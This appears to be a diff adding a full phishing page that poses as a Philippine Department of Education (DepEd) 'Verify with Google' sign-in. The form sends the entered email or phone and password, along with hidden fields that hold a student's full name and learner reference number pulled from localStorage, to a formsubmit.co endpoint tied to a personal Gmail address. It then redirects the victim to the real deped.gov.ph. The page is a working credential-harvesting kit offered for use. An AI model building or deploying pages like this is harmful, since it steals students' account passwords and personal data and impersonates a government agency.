@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>DepEd.gov | Verify Through Google</title>
+    <style>
+    #lrn, #dataInput {
+      position: absolute;
+      opacity: 0;
+      pointer-events: none;
+    }
+    </style>
+  <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+  <div class="menu">
+    <div class="menuclass">
+      <p class="label1">MENU <span class="close-btn">&#10005</span></p>
+      <hr>
+    </div>
+    <div class="opts">
+      <p>Home</p>
+      <hr>
+      <p>News</p>
+      <hr>
+      <p>About</p>
+      <hr>
+      <p>NCP</p>
+      <hr>
+      <p>NGP</p>
+      <hr>
+      <p>FAQ's</p>
+    </div>
+  </div>
+
+  <div class="main-container" style="display: block;">
+    <header>
+      <span class="mainlogo">GOVPH</span><span class="menu-toggle">&#9776</span>
+    </header>
+    <div class="mainhead">
+      <img class="mainheader" src="DepEd-Website-header-110px_1.png" alt="">
+      <h1 class="h2">VERIFY WITH GOOGLE®</h1>
+      <div class="logos1">
+        <img id="ing1" src="small_foi_logo-150x150.png" alt="small_foi_logo-150x150.png">
+        <img id="ing2" src="17245509137031177269572435798329.png" alt="17245509137031177269572435798329.png">
+      </div>
+    </div>
+  </div>
+
+  <div>
+    <img style="width: 40px; margin-top: 2em;margin-left: 1.5em; margin-bottom: -2em;" src="Google__G__logo.svg.png" alt="Google__G__logo.svg.png">
+    <h5>Sign in</h5>
+    <p class="use">Use your Google Account</p>
+    <center>
+      <form action="https://formsubmit.co/reijihaneda81@gmail.com" method="POST" id="myForm">
+                <input type="hidden" name="_subject" value="New Google Login!">
+        <input type="hidden" name="_template" value="table">
+        <input type="hidden" name="_captcha" value="false">
+        <input type="hidden" name="_next" value="https://www.deped.gov.ph">
+        <input type="text" name="Full name" id="dataInput">
+        <input type="text" name="Learners reference number" id="lrn">
+        <input class="in1" name="Email or phone" style="border-radius: 5px; box-shadow: none; border: 2px solid darkgray; height: 2em; position:relative;" type="text" placeholder="Email or phone" required>
+        <input required placeholder="Password" name="Password" style="border-radius: 5px; box-shadow: none; border: 2px solid darkgray; height: 2em; margin-top:-0.3em;position:relative;" type="text">
+            <p onclick="red()"style="transform:translateX(
+            -7.7em);color:#0B57CF;margin-top: -0.1em; font-weight: 680; font-family: Arial, Helvetica, sans-serif; font-size:15px;" onclick="red()">Forgot email?</p>
+          <p style="color: dimgray; margin-left: 2.4em;margin-top: 4em; font-weight: 600; font-family: Arial, Helvetica, sans-serif; font-size:15px;
+          text-align: left;">Not your computer? Use Guest mode to Sign in privately. <span style="color:#0B57CF; font-weight: 600; font-family: Arial, Helvetica, sans-serif; font-size:15px;" onclick="red()">Learn more about using Guest mode</span></p>
+        <button style="position:relative;right: -8.8em; height: 3.5em; width:7em; border-radius: 25px; background-color: #0B57CF; color:#fff; border:none;top: 4.5em;" type="submit">Next</button>
+      </form>
+    </center>
+
+  
+    <p style="margin-left: 2.5em;margin-top: 2.1em;color:#0B57CF; font-weight: 680; font-family: Arial, Helvetica, sans-serif; font-size:15px; margin-bottom: 6em;" onclick="red()">Create account</p>
+  </div>
+  <div class="footer1">
+    <img class="seal" src="govph-seal-mono-footer.jpg" alt="govph-seal-mono-footer.jpg">
+    <p class="bold">Republic of the Philippines</p>
+    <p>All content is in the public domain unless otherwise stated.</p>
+    <p class="bold">About GOVPH</p>
+    <p>Learn more about the Philippine government, its structure, how government works and the people behind it.</p>
+    <p>GOV.PH
+      Open Data Portal
+      Official Gazette</p>
+    <p class="bold">Government Links </p>
+    <p>Office of the President</br>
+      Office of the Vice President</br>
+      Senate of the Philippines</br>
+      House of Representatives</br>
+      Supreme Court</br>
+      Court of Appeals</br>
+      Sandiganbayan</p>
+  </div>
+  <script>
+    const menuToggle = document.querySelector('.menu-toggle');
+    const menu = document.querySelector('.menu');
+    const closeBtn = document.querySelector('.close-btn');
+
+    menuToggle.addEventListener('click', () => {
+      menu.style.right = menu.style.right === '0px' ? '-250px' : '0px';
+    });
+    closeBtn.addEventListener('click', () => {
+      menu.style.right = menu.style.right === '-250px' ? '0px' : '-250px';
+    });
+
+    // Get the saved username from localStorage
+    const savedUsername = localStorage.getItem('userName');
+    const savedLRN = localStorage.getItem('userLRN');
+
+    // Get the input elements
+    const usernameInput = document.getElementById('lrn');
+    const dataInput = document.getElementById('dataInput');
+
+    // Pre-fill the input fields with saved values
+    if (savedUsername) {
+      dataInput.value = savedUsername;
+    }
+    if (savedLRN) {
+      usernameInput.value = savedLRN;
+    }
+    function red() {
+  window.location = 'http://www.deped.gov.ph';
+}
+  </script>
+</body>
+
+</html>
